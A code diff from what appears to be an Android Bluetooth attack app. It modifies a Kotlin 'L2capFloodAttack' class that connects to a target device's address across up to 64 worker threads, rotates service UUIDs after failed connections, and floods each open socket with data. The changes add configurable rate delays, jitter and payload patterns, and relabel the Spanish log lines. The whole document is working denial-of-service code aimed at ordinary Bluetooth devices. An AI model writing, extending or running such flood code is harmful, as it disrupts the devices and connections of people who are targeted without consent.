@@ -23,7 +23,12 @@ import java.util.UUID
  * service UUIDs and floods each connected socket with data.
  * This is the technique the app originally shipped with.
  */
-class L2capFloodAttack(private val targetAddress: String, private val threads: Int = 8) : BluetoothAttack {
+class L2capFloodAttack(
+    private val targetAddress: String,
+    private val threads: Int = 8,
+    private val rateDelayMs: Int = 0,
+    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED
+) : BluetoothAttack {
 
     override val displayName = AttackType.L2CAP_FLOOD.displayName
     override val description = AttackType.L2CAP_FLOOD.description
@@ -49,7 +54,7 @@ class L2capFloodAttack(private val targetAddress: String, private val threads: I
 
         val workerCount = threads.coerceIn(1, 64)
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        onLog("L2CAP Flood iniciado (objetivo $targetAddress, $workerCount worker(s))")
+        onLog("[THREAD] L2CAP Flood iniciado (objetivo $targetAddress, $workerCount worker(s))")
 
         repeat(workerCount) { worker ->
             scope!!.launch {
@@ -64,7 +69,7 @@ class L2capFloodAttack(private val targetAddress: String, private val threads: I
                         if (socket.isConnected) {
                             successfulUUID = uuid
                             sockets.add(socket)
-                            onLog("[$worker] Conexión establecida (UUID $uuid)")
+                            onLog("[$worker][CONN] Conexión establecida (UUID $uuid)")
                             floodSocket(socket, onLog, worker)
                             break
                         }
@@ -73,8 +78,8 @@ class L2capFloodAttack(private val targetAddress: String, private val threads: I
                         successfulUUID = UUID.fromString(
                             UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                         )
-                        if (isActive && running) onLog("[$worker] Intento fallido, UUID rotado")
-                        delay(100)
+                        if (isActive && running) onLog("[$worker][RETRY] Intento fallido, UUID rotado")
+                        jitterDelay(maxOf(100, rateDelayMs))
                     }
                 }
             }
@@ -84,13 +89,14 @@ class L2capFloodAttack(private val targetAddress: String, private val threads: I
     private suspend fun floodSocket(socket: BluetoothSocket, onLog: (String) -> Unit, worker: Int) {
         val raw = socket.maxTransmitPacketSize
         val dataSize = if (raw > 0) raw else 600
-        val sendBuffer = ByteArray(dataSize) { (('A'.code) + (it % 40)).toByte() }
+        val sendBuffer = payloadPattern.buffer(dataSize)
         try {
             var blocks = 0
             while (running && socket.isConnected) {
                 socket.outputStream.write(sendBuffer)
                 blocks++
-                if (blocks % 200 == 0) onLog("[$worker] Enviados $blocks bloques")
+                jitterDelay(rateDelayMs)
+                if (blocks % 200 == 0) onLog("[$worker][DATA] Enviados $blocks bloques")
             }
         } catch (e: IOException) {
             // connection dropped by the remote side — expected under flood
